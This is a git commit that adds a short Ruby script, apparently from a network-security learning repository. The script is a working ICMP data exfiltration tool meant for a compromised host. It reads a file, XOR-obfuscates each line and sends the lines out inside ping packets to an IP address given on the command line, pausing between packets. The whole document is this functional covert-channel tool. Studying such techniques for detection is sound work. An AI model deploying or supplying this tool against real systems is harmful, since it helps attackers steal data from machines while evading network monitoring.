3cc5d926d9f0d531e6b6c1d0428cf152816c7458
Alex Juarez <karmatr0n.dixit@gmail.com>
2022-11-17 20:11:10 -0600

    Add example of ICMP data exfiltration tool

---
+++ icmp_packets/data_exfiltration/compromised_host/exfiltration_tool.rb
@@ -0,0 +1,26 @@
+require 'packetfu'
+
+
+dest_ip = ARGV[0]
+file = ARGV[1]
+config = config = PacketFu::Utils.whoami?
+
+def encrypt_payload(string, key = 0x42)
+  string.bytes.map {|b| b ^ key }.pack('C*')
+end
+
+
+File.readlines(file).each do |line|
+  icmp_packet = PacketFu::ICMPPacket.new(:config => config)
+  icmp_packet.ip_daddr = dest_ip
+  icmp_packet.payload = encrypt_payload(line)
+  icmp_packet.icmp_type = 8
+  icmp_packet.recalc
+  icmp_packet.to_w
+
+  puts "=" * 80
+  puts icmp_packet.inspect
+  puts ""
+  sleep(2)
+end
+
